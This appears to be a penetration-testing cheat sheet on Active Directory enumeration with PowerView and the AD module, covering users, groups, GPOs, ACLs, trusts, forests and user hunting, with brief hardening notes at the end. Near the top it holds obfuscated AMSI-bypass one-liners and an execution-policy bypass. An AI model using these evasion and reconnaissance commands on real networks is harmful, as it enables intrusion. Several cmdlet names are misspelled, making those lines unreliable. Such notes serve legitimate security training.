# Domain Enumeration

## domain enum

### current domain

In powershell as a normal user:
```powershell
$ADClass = [System.DirectoryServices.ActiveDirctory.Domain]
$ADClass::GetCurrentDomain()
```
<br>

### built-in tools used for enum

```powershell
powershell -ep bypass
```

#### bypass amsi
old
```powershell
sET-ItEM ( &apos;V&apos;+&apos;aR&apos; +  &apos;IA&apos; + &apos;blE:1q2&apos;  + &apos;uZx&apos;  ) ( [TYpE](  "{1}{0}"-F&apos;F&apos;,&apos;rE&apos;  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f&apos;Util&apos;,&apos;A&apos;,&apos;Amsi&apos;,&apos;.Management.&apos;,&apos;utomation.&apos;,&apos;s&apos;,&apos;System&apos;  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f&apos;amsi&apos;,&apos;d&apos;,&apos;InitFaile&apos;  ),(  "{2}{4}{0}{1}{3}" -f &apos;Stat&apos;,&apos;i&apos;,&apos;NonPubli&apos;,&apos;c&apos;,&apos;c,&apos;  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
new
```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

#### Powerview
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
```powershell
C:\powerview\location\. .\PowerView.ps1
```

#### ActiveDirectory PowerShell module
https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=windowsserver2019-ps&viewFallbackFrom=win10-ps
```powershell
Import-Module .\Microsoft.ActiveDirectory.Management.dll
Import-Module .\ActiveDirectory\ActiveDirectory.psd1
```

#### current domain
```powershell
Get-NetDomain   # powerview

Get-ADDomain    # AD module
```

#### object of another domain
```powershell
Get-NetDomain -Domain domain_2.local    # powerview

Get-ADDomain -Identity domain_2.local   # AD module
```

#### domain SID for current domain
```powershell
Get-DomainSID              # powerview

(Get-ADDomain).DomainSID   # AD module
```

#### domain policy for current domain
```powershell
Get-DomainPolicy		     # powerview
(Get-DomainPolicy)."system access"   # powerview
```

#### domain policy for another domain
```powershell
(Get-DomainPolicy -domain domain_2.local)."system access"   # powerview
```

#### domain controllers for current domain 
```powershell
Get-NetDomainController   # powerview

Get-ADDomainController    # AD module
```

#### domain controllers for another domain
```powershell
Get-NetDomainController -Domain domain_2.local                # powerview

Get-ADDomainController -DomainName domain_2.local -Discover   # AD module
```

#### list of users in current domain
```powershell
Get-NetUser				     # powerview
Get-NetUser -Username someuser   

Get-ADUser -Filter * -Properties *          # AD module
Get-ADUser -Identity someuser -Properties *   
```

#### list all properties for users in current domain
```powershell
Get-UserProperty		         # powerview
Get-UserProperty -Properties pwdlastset

Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -Membertype *Property | select Name     # AD module
Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}  
```

#### search a specific string in a user's attributes
often sysadmins would add valuable info to a user's description. example, the password for a shared user (helpdesk, support, domain account etc).

```powershell
Find-UserField -SearchField Description -SearchTerm "built"   # powerview

Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description   # AD module
```

#### list computers in current domain
```powershell
Get-NetComputer   # powerview
Get-NetComputer -OperatingSystem "*Server 2016*"
Get-NetComputer -Ping
Get-NetComputer -FullData

Get-ADComputer -Filter * | select Name   # AD module
Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name,OperatingSystem
Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}
Get-ADComputer -Filter * -Properties *
```

#### groups in current domain
```powershell
Get-NetGroup   # powerview
Get-NetGroup -Domain targetdomain
Get-NetGroup -FullData

Get-ADGroup -Filter * | select Name   # AD module
Get-ADGroup -Filter * -properties *
```

#### search all groups containing a specific word
```powershell
Get-NetGroup *admin*   # powerview
Get-NetGroup -GroupName *admin*

Get-ADGroup -Filter 'Name -like "*admin*"' | select Name   # AD module
```

#### list all members of the domain admin group
```powershell
Get-NetGroupMember -GroupName "Domain Admins" -Recurse   # powerview

Get-ADGroupMember -Identify "Domain Admin" -Recursive   # AD module
```

#### group membership of a user
```powershell
Get-NetGroup -UserName "someuser"   # powerview

Get-ADPrincicalGroupMembership -Identity someuser   # AD module
``` 

#### all local groups on a machine
need admin rights on non-dc machines

```powershell
Get-NetLocalGroup -ComputerName compname.sub.somedomain.local -ListGroups
```

#### members of all local groups on machine
need admin rights on non-dc machines

```powershell
Get-NetLocalGroup -ComputerName compname.sub.somedomain.local -Recurse   # powerview
```
 
#### all logged on users on a computer
need local admin access on targer

```powershell
Get-NetLoggedon -ComputerName servername   # powerview
```

#### local users logged in on computer
remote registry on target - started by default on server os

```powershell
GetLoggedonLocal -ComputerName compname.sub.somedomain.local   # powerview
```

#### last user logged on computer
need admin rights and remote registry on target

```powershell
Get-LastLoggedOn -ComputerName servername   # powerview
```

#### find shares in current domain
```powershell
Invoke-ShareFinder -Verbose
```

#### find sensitive files on computers in the domain
```powershell
Invoke-FileFinder -Verbose
```

#### find all fileservers on the domain
```powershell
Get-NetFileServer
```

<br>

## domain enum - GPO (Group Policy Object)

* ability to manage config and changes centrally in AD
* config of
  * security settings
  * registry-based policy settings
  * group policy preferences startup/shutdown/logon/logoff script settings
  * software install
* abuse GPO for attacks like backdoors, persistence, privesc etc. 


#### current domain GPO
```powershell
Get-NetGPO   ## powerview
Get-NetGPO -ComputerName compname.sub.domain.local 

Get-GPO -All   ## GroupPolicy module)
Get-GPResultantSetOfPolicy -ReportType Html -Path C:\Users\Administrator\report.html   ## provides RSoP
```

#### GPO use Restricted Groups / groups.xml for interesting users
```powershell
Get-NetGPOGroup
```

#### users in local group on machine using GPO
```powershell
Find-GPOComputerAdmin -Computername compname.sub.domain.local
```

#### machines where the given user is a member of specific group
```powershell
Find-GPOLocation -UserName student -Verbose
```

#### OU's in a domain
```powershell
Get-NetOI -FullData   ## powerview

Get-ADOrganizationalUnit -Filter * -Properties *   ## AD module
```

#### GPO applied on an OU. GPOname from gplink attribute from Get-NetOU
```powershell
Get-NetGPO -GPOname "{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxxx}"   ## powerview

Get-GPO -Guid xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxxx   ## GroupPolicy module
```

<br>

## domain enum - ACL

### Access Control Model

* Enables control on the ability of a process to access objects and other resources in active directory based on:
  * Access Tokens (security context of a process - identity and privs of user)
  * Security Descriptors (SID of the owner, Discretionary ACL (DACL) and System ACL (SACL))


### Access Controll List (ACL)

* List of Access Control Entries (ACE) - Ace corresponds to individual permission or audits access. Who has permission and what can be done on an object?

* Two types:
  * DACL - Defines the permissions trustees (user or group) have on an object
  * SACL - Logs success and failure audit messages when an object is accessed

* ACLS vital to security architecture of AD


#### ACLs associated with specified object
```powershell
Get-ObjectAcl -SamAccountName student1 -ResolveGUIDs   ## powerview
```

#### ACLs associated with specified prefix to be used for search
```powershell
Get-ObjectAcl -ADSprefix 'CN=Administrator, CN=Users' -Verbose   ## powerview
```

#### enumerate ACLs using AD module without resolving GUIDs
```powershell
(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=sub,DC=domain,DC=local').Access
```

#### ACLs associated with the specified LDAP path to be used for search
```powershell
Get-ObjectAcl -ADSpath "LDAP://CN=Domain Admins,CN=Users,DC=sub,DC=domain,DC=local" -ResolveGUIDs -Verbose   ## powerview
```

#### Search for interesting ACEs
```powershell
Invoke-ACLScanner -ResolveGUIDs   ## powerview
```

#### ACLs associated with specified path
```powerview
Get-PathAcl -Path "\\dc.sub.domain.local\sysvol"   ## powerview
```


<br>

## domain enum - Trusts

* In AD environment, trust is a relationship between two domains or forests which allows users of one domain or forest to access resources in the other domain or forest.

* Trust can be automatic (parent-child, same forest etc.) or established (forest, external).

* Trusted Domain Objects (TDOs) represent the trust relationship in a domain.


### Trust Direction

* one way trust - unidirectional. users in the trusted domain can access resources in the trusting domain but the reverse is not true.

* two way trust - bi-directional. users of both domains can access resources in the other domain.


### Trust Transitivity

* Transitive - can be extended to establish trust relationships with other domains
  * default intra-forest trust relationships (Tree-root, parent-child) between domains within same forest are transitive two way trusts.

Domain 1 <--> Domain 2 <--> Domain 3
     \                      /
      <-------------------->

* Nontransitive - cannot be extended to other domains in the forest. Can be two way or one way.
  * This is the default trust (called external trust) between two domains in different forests when forests do not have a trust relationship.


### domain trusts

* default / automatic trusts
  * parent-child trust - created automatically between new domain and the domain that precedes it in the namespace hierarchy, whenever a new domain is added in a tree. example sub.domain.local is a child of domain.local
    * this trust is always two way transitive
  * tree-root trust - created automatically between whenever a new domain tree is added to a forest root
    * this trust is always two way transitive

* shortcut trusts
  * used to reduce access times in complex trust scenarios
  * can be one way or two way transitive

* external trusts
  * between two domains in different forests when forests do not have a trust relationship
  * can be one way or two way and is nontransitive


### forest trusts

* between forest root domain
* cannot extend to a third forest (no implicit trust)
* can be one way or two way and transitive or nontransitive


#### domain trust mapping
```powershell
Get-NetDomainTrust   ## powerview
Get-NetDomainTrust -Domain sub.domain.local

GetADTrust   ## AD module
GetADTrust -Identity sub.domain.local
```


<br>

## domain enum - forest

###  forest mapping

* details about current forest

```powershell
Get-NetForest   ## powerview
Get-NetForest -Forest domain.local

Get-ADForest   ## AD module
Get-ADForest -Identity domain.local
```

* all domains in current forest

```powershell
Get-NetForestDomain   ## powerview
Get-NetForestDomain -Forest domain.local

(Get-ADForest).Domains   ## AD module
```

* all global catalogs for current forest
```powershell
Get-NetForestCatalog   ## powerview
Get-NetForestCatalog -Forest domain.local

Get-ADForest | select -ExpandProperty GlobalCatalogs   ## AD module
```

* map trusts of a forest
```powershell
Get-NetForestTrust   ## powerview
Get-NetForestTrust -Forest domain.local

Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'   ## AD module
```


<br>

## domain enum - user hunting

note: the following enumeration will be considered "noiser" than what has been done up until now.

* find all machines on the current domain where the current user has local admin access
```powershell
Find-LocalAdminAccess -Verbose
```

* this function queries the DC of the current or provided domain for a list of computers (Get-NetComputer) and then use multi-threaded Invoke-CheckLocalAdminAccess on each domain.
```powershell
(Get-NetComputer)
Invoke-CheckLocalAdminAccess
```

* remote admin tools like WMI and powershell remoting. useful in cases where ports (RPC and SMB) used by Find-Local-AdminAccess are blocked.

* Find-WMILocalAdminAccess.ps1 - need to find the script.

* find local admins on all machines of the domain (needs admin privs on non-dc machines)
```powershell
Invoke-EnumerateLocalAdmin -Verbose
```

* This function queries the DC of the current provided domain for a list of computers (Get-NetComputer) and then use multi-threaded Get-NetLocalGroup on each machine

* find computers where a domain admin (or specified user/group) has sessions
```powershell
Invoke-UserHunter
Invoke-UserHunter -GroupName "RDPUsers"
```

* this function queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using Get-NetGroupMember, gets a list of computers (Get-NetComputer) and list sessions and logged on users (Get-NetSession/Get-NetLoggedon) from each machine

* confirm admin access
```powershell
Invoke-UserHunter -CheckAccess
```

* find computers where a domain admin is logged-in
```powershell
Invoke-UserHunter -Stealth
```

* this options queries the DC of the current or provided domain for menbers of the given group (Domain Admins by default) using Get-NetGroupMember, gets a list only of high traffic servers (DC, file servers and distributed file servers) for less traffic generation and list session and logged on users (Get-NetSession/Get-Netloggedon) from each machine.



<br>

## domain enum - defense

* most enum mixes well with normal traffic to the DC
* hardening can be done on the DC or other machines to contain the information provided by the queried machine

* Netcease is a script which changes permissions on the NetSessionEnum method by removing permission for Authenticated Users Group
* This stops many of the attackers enumeration and user hunting capabilities.

* SAMRi10 hardens Windows 10 and Server 2016 against enum which uses SAMR protocol (i.e. net.exe)
* google SAMRi10 hardening remote microsoft










































































